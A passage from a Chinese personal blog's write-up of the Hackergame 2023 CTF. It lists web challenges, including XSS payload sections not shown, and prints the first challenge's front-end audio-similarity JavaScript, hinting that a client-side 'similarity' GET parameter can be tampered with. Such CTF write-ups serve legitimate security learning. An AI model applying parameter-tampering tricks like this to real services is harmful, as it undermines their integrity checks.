
<!DOCTYPE html>
<html lang="zh-CN">

<head>
    <meta charset="UTF-8" />
    <title>Hackergame 2023 | 雲流のLowest World</title>
    <meta name="author" content="C1oudfL0w0" />
    <meta name="description" content="" />
    <meta name="keywords" content="" />
    <meta name="viewport" content="width=device-width,initial-scale=1.0,maximum-scale=1.0,user-scalable=0" />
    <link rel="icon" href="/blog/images/croppedImage_cropped.jpg" />
    <!-- cdn挂掉的时候要可以引用本地 -->
<!-- <script src="https://cdn.staticfile.org/vue/3.2.45/vue.global.prod.min.js"></script> -->
<script src="/blog/js/vue.global.prod.min.js"></script>


<link rel="stylesheet" href="https://cdn.staticfile.org/font-awesome/6.2.1/css/all.min.css" />


<link rel="stylesheet" href="/blog/css/all.min.css" />
<link rel="stylesheet" href="/blog/css/fonts.min.css" />
<link rel="stylesheet" href="/blog/css/search.css" />
<script> const mixins = {}; </script>

<!-- 引入jQuery-->
<!-- <script type="text/javascript" src="https://apps.bdimg.com/libs/jquery/2.1.4/jquery.min.js"></script> -->
<script src="/blog/js/jquery.min.js"></script>

<!--改成了prismjs高亮-->

<script src="/blog/js/lib/prism.js"></script>
<link rel="stylesheet" href="/blog/css/prism.css" rel="stylesheet" />



<script src="/blog/js/lib/preview.js"></script>










<script src="/blog/js/lib/home.js"></script>

<link rel="stylesheet" href="/blog/css/main.css" />
<!-- 引入不蒜子-->

<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeBlockFuction.js"></script>
<!-- 代码语言 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeLang.js"></script>
<!-- 代码块复制 -->
<!-- 引入clipboard -->

<script src="https://cdnjs.cloudflare.com/ajax/libs/clipboard.js/2.0.8/clipboard.min.js"></script>

<script type="text/javascript" src="/blog/libs/codeBlock/codeCopy.js"></script>
<!-- 代码块收缩 -->
<script type="text/javascript" src="/blog/libs/codeBlock/codeShrink.js"></script> 
<!-- 代码块折行 -->
<style type="text/css">code[class*="language-"], pre[class*="language-"] { white-space: pre !important; }</style>
<meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/blog/atom.xml" title="雲流のLowest World" type="application/atom+xml">
</head>

<body>
    <!--flag{never_g0nna g1ve_you up}-->

    <!-- 页面点击特效 -->
    <script type="text/javascript" src="/blog/js/love-click.js"></script>

    <!-- 浏览器标题 -->
    <script async type="text/javascript" src="/blog/js/FunnyTitle.js"></script>

    <!-- 动态背景 -->
    

    <!--文章目录-->
    
    <div id="toc" class="toc-article">
    <h3><i class="fas fa-stream"></i>  目录</h3>
      <div class="toc-title"></div>
      <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">前言</span></a></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web"><span class="toc-number">2.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Hackergame-%E5%90%AF%E5%8A%A8"><span class="toc-number">2.1.</span> <span class="toc-text">Hackergame 启动</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%9B%B4%E6%B7%B1%E6%9B%B4%E6%9A%97"><span class="toc-number">2.2.</span> <span class="toc-text">更深更暗</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%B5%9B%E5%8D%9A%E4%BA%95%E5%AD%97%E6%A3%8B"><span class="toc-number">2.3.</span> <span class="toc-text">赛博井字棋</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%BB%84%E5%A7%94%E4%BC%9A%E6%A8%A1%E6%8B%9F%E5%99%A8"><span class="toc-number">2.4.</span> <span class="toc-text">组委会模拟器</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#HTTP-%E9%9B%86%E9%82%AE%E5%86%8C%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">2.5.</span> <span class="toc-text">HTTP 集邮册（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%94%B6%E9%9B%86%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">2.5.1.</span> <span class="toc-text">收集状态码</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%97%A0%E7%8A%B6%E6%80%81%E7%A0%81"><span class="toc-number">2.5.2.</span> <span class="toc-text">无状态码</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%BE%AE%E7%A7%AF%E5%88%86%E8%AE%A1%E7%AE%97%E5%B0%8F%E7%BB%83%E4%B9%A0-2-0%EF%BC%88%E5%A4%8D%E7%8E%B0%EF%BC%89"><span class="toc-number">2.6.</span> <span class="toc-text">微积分计算小练习 2.0（复现）</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%89%BExss%E6%B3%A8%E5%85%A5%E7%82%B9"><span class="toc-number">2.6.1.</span> <span class="toc-text">找xss注入点</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%9E%84%E9%80%A0xss-payload"><span class="toc-number">2.6.2.</span> <span class="toc-text">构造xss payload</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%A9%E7%94%A8bot%E5%AE%9E%E7%8E%B0xss%EF%BC%88%E5%A4%8D%E7%8E%B0%E5%A4%B1%E8%B4%A5%EF%BC%89"><span class="toc-number">2.6.3.</span> <span class="toc-text">利用bot实现xss（复现失败）</span></a></li></ol></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#General"><span class="toc-number">3.</span> <span class="toc-text">General</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E8%99%AB"><span class="toc-number">3.1.</span> <span class="toc-text">虫</span></a></li></ol></li></ol>
    </div>
  

    <!--返回顶部-->
    <div id="totop" style="position:fixed;bottom:50px;right:60px;font-size: 48px;cursor: pointer;z-index: 10;">
        <a title="返回顶部">↑</a>
    </div>
    <script src="/blog/js/totop.js"></script>

    <div id="layout">
        
            <div id="content-background" ref="contentBackground" data-images="https://pic.imgdb.cn/item/65d61d809f345e8d03b8bc7a.png"></div>
            
        <transition name="fade">
            <div id="loading" v-show="loading">
                <div id="loading-circle">
                    <h2>LOADING</h2>
                    <p>第一次加载文章图片可能会花费较长时间</p>
                    <p>要不挂个梯子试试？（x</p>
                    <p>加载过慢请开启缓存&ensp;浏览器默认开启</p>
                    <img src="/blog/images/loading.gif" />
                </div>
            </div>
        </transition>
        <transition name="into">
            <div id="main" v-show="!loading">
                <nav id="menu" ref="menu">
    <div class="desktop-menu">
        <a class="title" href="/blog/">
            <span>雲流のLOWEST WORLD</span>
        </a>
        
        <a href="/blog/">
            <i class="fa-solid fa-house fa-fw"></i>
            <span>&ensp;Home</span>
        </a>
        
        <a href="/blog/about">
            <i class="fa-solid fa-id-card fa-fw"></i>
            <span>&ensp;About</span>
        </a>
        
        <a href="/blog/archives">
            <i class="fa-solid fa-box-archive fa-fw"></i>
            <span>&ensp;Archives</span>
        </a>
        
        <a href="/blog/categories">
            <i class="fa-solid fa-bookmark fa-fw"></i>
            <span>&ensp;Categories</span>
        </a>
        
        <a href="/blog/tags">
            <i class="fa-solid fa-tags fa-fw"></i>
            <span>&ensp;Tags</span>
        </a>
        
        <a href="/blog/links">
            <i class="fa-solid fa-link fa-fw"></i>
            <span>&ensp;Links</span>
        </a>
        
        <a href="/blog/search">
            <i class="fa-solid fa-search fa-fw"></i>
            <span>&ensp;Search</span>
        </a>
        
    </div>
    <div id="mobile-menu">
        <div class="curtain" v-show="showMenu" @click="showMenu = !showMenu"></div>
        <div class="title" @click="showMenu = !showMenu">
            <i class="fa-solid fa-bars fa-fw"></i>
            <span>&emsp;雲流のLOWEST WORLD</span>
        </div>
        <transition name="slide">
        <div class="items" v-show="showMenu">
            
            <a href="/blog/">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-house fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Home</div>
                </div>
            </a>
            
            <a href="/blog/about">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-id-card fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">About</div>
                </div>
            </a>
            
            <a href="/blog/archives">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-box-archive fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Archives</div>
                </div>
            </a>
            
            <a href="/blog/categories">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-bookmark fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Categories</div>
                </div>
            </a>
            
            <a href="/blog/tags">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-tags fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Tags</div>
                </div>
            </a>
            
            <a href="/blog/links">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-link fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Links</div>
                </div>
            </a>
            
            <a href="/blog/search">
                <div class="item">
                    <div style="min-width: 20px; max-width: 50px; width: 10%">
                        <i class="fa-solid fa-search fa-fw"></i>
                    </div>
                    <div style="min-width: 100px; max-width: 150%; width: 20%">Search</div>
                </div>
            </a>
            
        </div>
        </transition>
    </div>
</nav>

                <div class="article">
    <div>
        <h1>Hackergame 2023</h1>
    </div>
    <div class="info">
        <span class="date">
            <span class="icon">
                <i class="fa-solid fa-calendar fa-fw"></i>
            </span>
            2023/11/3
        </span>
        
        <span class="category">
            <a href="/blog/categories/CTF%E7%BA%BF%E4%B8%8A%E8%B5%9B/">
                <span class="icon">
                    <i class="fa-solid fa-bookmark fa-fw"></i>
                </span>
                CTF线上赛
            </a>
        </span>
        
        
        <!--文章字数统计-->
        
            
<div style="margin-top:10px;">
    <span class="post-time">
      <span class="post-meta-item-icon">
        <i class="fa fa-keyboard-o"></i>
        <span class="post-meta-item-text">  字数统计: </span>
        <!-- 安装插件npm install hexo-wordcount --save -->
        <span class="post-count">4k字</span>
      </span>
    </span>

    <span class="post-time">
      &nbsp; | &nbsp;
      <span class="post-meta-item-icon">
        <i class="fa fa-hourglass-half"></i>
        <span class="post-meta-item-text">  阅读时长: </span>
        <span class="post-count">18分</span>
      </span>
    </span>
    
    <!--不蒜子统计访问数-->
    <span id="busuanzi_container_page_pv">
    &nbsp; | &nbsp;
    总文章阅读量：<span id="busuanzi_value_page_pv"></span>次
    </span>
</div>

          
    </div>
    
    <div class="content" v-pre>
        <h1 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h1><p>中科大的ctf，和隔壁Geekgame差不多，都是以整活为主，不过这里的题会更基础一点</p>
<p>官方wp：<a target="_blank" rel="noopener" href="https://github.com/USTC-Hackergame/hackergame2023-writeups">https://github.com/USTC-Hackergame/hackergame2023-writeups</a></p>
<p>啧，TPCTF2023出现了这个比赛某题的延伸，这下不得不复现完了</p>
<span id="more"></span>

<h1 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h1><h2 id="Hackergame-启动"><a href="#Hackergame-启动" class="headerlink" title="Hackergame 启动"></a>Hackergame 启动</h2><p>直接点击提交，可以发现get请求多了个参数similarity</p>
<p><img src="/blog/2023/11/03/Hackergame-2023/image-20231103221117607.png" alt="image-20231103221117607"></p>
<p>ctrl+u看看前端js写了啥</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token comment">//</span>
<span class="token comment">// Ref wave</span>
<span class="token comment">//</span>
<span class="token keyword">const</span> wavesurferRef <span class="token operator">=</span> WaveSurfer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">container</span><span class="token operator">:</span> <span class="token string">'#ref-wave'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">waveColor</span><span class="token operator">:</span> <span class="token string">'rgb(200, 0, 200)'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">progressColor</span><span class="token operator">:</span> <span class="token string">'rgb(100, 0, 100)'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">url</span><span class="token operator">:</span> <span class="token string">'/static/hackergame.mp3'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">backend</span><span class="token operator">:</span> <span class="token string">'MediaElement'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> regions <span class="token operator">=</span> wavesurferRef<span class="token punctuation">.</span><span class="token function">registerPlugin</span><span class="token punctuation">(</span>WaveSurfer<span class="token punctuation">.</span>Regions<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
wavesurferRef<span class="token punctuation">.</span><span class="token function">once</span><span class="token punctuation">(</span><span class="token string">'interaction'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  wavesurferRef<span class="token punctuation">.</span><span class="token function">play</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

wavesurferRef<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  regions<span class="token punctuation">.</span><span class="token function">addRegion</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">start</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>
    <span class="token literal-property property">end</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>
    <span class="token literal-property property">drag</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">'Hackergame'</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  regions<span class="token punctuation">.</span><span class="token function">addRegion</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    <span class="token literal-property property">start</span><span class="token operator">:</span> <span class="token number">1.4</span><span class="token punctuation">,</span>
    <span class="token literal-property property">end</span><span class="token operator">:</span> <span class="token number">2.0</span><span class="token punctuation">,</span>
    <span class="token literal-property property">drag</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>
    <span class="token literal-property property">content</span><span class="token operator">:</span> <span class="token string">'启动'</span><span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> btnPlayRef <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#btn-play-ref'</span><span class="token punctuation">)</span>
btnPlayRef<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> wavesurferRef<span class="token punctuation">.</span><span class="token function">playPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment">//</span>
<span class="token comment">// Record</span>
<span class="token comment">//</span>
<span class="token keyword">const</span> wavesurfer <span class="token operator">=</span> WaveSurfer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
  <span class="token literal-property property">container</span><span class="token operator">:</span> <span class="token string">'#mic-wave'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">waveColor</span><span class="token operator">:</span> <span class="token string">'rgb(200, 0, 200)'</span><span class="token punctuation">,</span>
  <span class="token literal-property property">progressColor</span><span class="token operator">:</span> <span class="token string">'rgb(100, 0, 100)'</span><span class="token punctuation">,</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>


<span class="token keyword">const</span> record <span class="token operator">=</span> wavesurfer<span class="token punctuation">.</span><span class="token function">registerPlugin</span><span class="token punctuation">(</span>WaveSurfer<span class="token punctuation">.</span>Record<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>

wavesurfer<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'decode'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>record<span class="token punctuation">.</span><span class="token function">isRecording</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">try</span> <span class="token punctuation">&#123;</span>
      <span class="token comment">// sleep 100ms</span>
      <span class="token keyword">const</span> similaritySpan <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#similarity'</span><span class="token punctuation">)</span>
      <span class="token keyword">const</span> similarity <span class="token operator">=</span> <span class="token function">getCurrentSimilarity</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">100</span>
      similaritySpan<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token template-string"><span class="token template-punctuation string">`</span><span class="token string">相似度：</span><span class="token interpolation"><span class="token interpolation-punctuation punctuation">$&#123;</span>similarity<span class="token punctuation">.</span><span class="token function">toFixed</span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token interpolation-punctuation punctuation">&#125;</span></span><span class="token string">%</span><span class="token template-punctuation string">`</span></span>
      <span class="token keyword">const</span> similarityValue <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#similarity-value'</span><span class="token punctuation">)</span>
      similarityValue<span class="token punctuation">.</span>value <span class="token operator">=</span> similarity
    <span class="token punctuation">&#125;</span> <span class="token keyword">catch</span> <span class="token punctuation">(</span>e<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span>e<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token comment">// Render recorded audio</span>
record<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'record-end'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token parameter">blob</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> container <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#record-wave'</span><span class="token punctuation">)</span>
  container<span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> <span class="token string">''</span>
  <span class="token keyword">const</span> recordedUrl <span class="token operator">=</span> <span class="token constant">URL</span><span class="token punctuation">.</span><span class="token function">createObjectURL</span><span class="token punctuation">(</span>blob<span class="token punctuation">)</span>

  <span class="token comment">// Create wavesurfer from the recorded audio</span>
  <span class="token keyword">const</span> wavesurfer <span class="token operator">=</span> WaveSurfer<span class="token punctuation">.</span><span class="token function">create</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span>
    container<span class="token punctuation">,</span>
    <span class="token literal-property property">waveColor</span><span class="token operator">:</span> <span class="token string">'rgb(200, 100, 0)'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">progressColor</span><span class="token operator">:</span> <span class="token string">'rgb(100, 50, 0)'</span><span class="token punctuation">,</span>
    <span class="token literal-property property">url</span><span class="token operator">:</span> recordedUrl<span class="token punctuation">,</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

  <span class="token comment">// Play button</span>
  <span class="token keyword">const</span> buttonPlay <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#btn-play'</span><span class="token punctuation">)</span>
  buttonPlay<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'播放录制音频'</span>
  buttonPlay<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> wavesurfer<span class="token punctuation">.</span><span class="token function">playPause</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
  wavesurfer<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'pause'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>buttonPlay<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'播放录制音频'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
  wavesurfer<span class="token punctuation">.</span><span class="token function">on</span><span class="token punctuation">(</span><span class="token string">'play'</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">(</span>buttonPlay<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'暂停录制音频'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>

<span class="token keyword">const</span> micSelect <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#mic-select'</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token comment">// Mic selection</span>
  WaveSurfer<span class="token punctuation">.</span>Record<span class="token punctuation">.</span><span class="token function">getAvailableAudioDevices</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">devices</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    devices<span class="token punctuation">.</span><span class="token function">forEach</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">device</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
      <span class="token keyword">const</span> option <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">createElement</span><span class="token punctuation">(</span><span class="token string">'option'</span><span class="token punctuation">)</span>
      option<span class="token punctuation">.</span>value <span class="token operator">=</span> device<span class="token punctuation">.</span>deviceId
      option<span class="token punctuation">.</span>text <span class="token operator">=</span> device<span class="token punctuation">.</span>label <span class="token operator">||</span> device<span class="token punctuation">.</span>deviceId
      micSelect<span class="token punctuation">.</span><span class="token function">appendChild</span><span class="token punctuation">(</span>option<span class="token punctuation">)</span>
    <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#123;</span>
  <span class="token comment">// Record button</span>
  <span class="token keyword">const</span> recButton <span class="token operator">=</span> document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#record'</span><span class="token punctuation">)</span>

  recButton<span class="token punctuation">.</span><span class="token function-variable function">onclick</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span>record<span class="token punctuation">.</span><span class="token function">isRecording</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
      record<span class="token punctuation">.</span><span class="token function">stopRecording</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
      recButton<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'开始录制'</span>
      recButton<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">'btn-danger'</span><span class="token punctuation">)</span>
      recButton<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'btn-primary'</span><span class="token punctuation">)</span>
      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#record-wave'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'inline'</span>
      document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#mic-wave'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span>
      <span class="token keyword">return</span>
    <span class="token punctuation">&#125;</span>

    recButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">true</span>
    <span class="token comment">// get selected device</span>
    <span class="token keyword">const</span> deviceId <span class="token operator">=</span> micSelect<span class="token punctuation">.</span>value

      record<span class="token punctuation">.</span><span class="token function">startRecording</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span> deviceId <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">then</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        recButton<span class="token punctuation">.</span>textContent <span class="token operator">=</span> <span class="token string">'停止'</span>
        recButton<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">remove</span><span class="token punctuation">(</span><span class="token string">'btn-primary'</span><span class="token punctuation">)</span>
        recButton<span class="token punctuation">.</span>classList<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token string">'btn-danger'</span><span class="token punctuation">)</span>
        recButton<span class="token punctuation">.</span>disabled <span class="token operator">=</span> <span class="token boolean">false</span>
        document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#record-wave'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'none'</span>
        document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'#mic-wave'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>style<span class="token punctuation">.</span>display <span class="token operator">=</span> <span class="token string">'inline'</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">catch</span><span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token parameter">err</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
        <span class="token function">alert</span><span class="token punctuation">(</span><span class="token string">"开始录制失败，请检查浏览器麦克风权限设置并刷新页面。"</span><span class="token punctuation">)</span>
      <span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
  <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>

<span class="token comment">//</span>
<span class="token comment">// Wave Similarity</span>
<span class="token comment">//</span>

<span class="token keyword">const</span> <span class="token function-variable function">getCanvasByContainer</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">container</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token operator">!</span>container <span class="token operator">||</span> <span class="token operator">!</span>container<span class="token punctuation">.</span>firstChild<span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token keyword">return</span> <span class="token keyword">null</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">const</span> canvas <span class="token operator">=</span> container<span class="token punctuation">.</span>firstChild<span class="token punctuation">.</span>shadowRoot<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">"canvas"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> canvas<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">getImageData</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">canvas</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
  <span class="token keyword">const</span> ctx <span class="token operator">=</span> canvas<span class="token punctuation">.</span><span class="token function">getContext</span><span class="token punctuation">(</span><span class="token string">"2d"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">const</span> imageData <span class="token operator">=</span> ctx<span class="token punctuation">.</span><span class="token function">getImageData</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>width<span class="token punctuation">,</span> canvas<span class="token punctuation">.</span>height<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> imageData<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">const</span> <span class="token function-variable function">computeSimilarity</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token parameter">imageData1<span class="token punctuation">,</span> imageData2</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>
